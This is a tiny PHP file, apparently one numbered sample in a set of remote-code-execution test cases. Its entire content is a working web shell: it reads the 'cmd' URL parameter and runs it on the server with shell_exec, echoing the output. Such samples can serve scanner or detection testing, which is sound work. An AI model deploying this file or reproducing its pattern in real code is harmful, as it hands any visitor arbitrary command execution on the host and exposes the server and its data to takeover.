<?php
// RCE test variation #1034
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>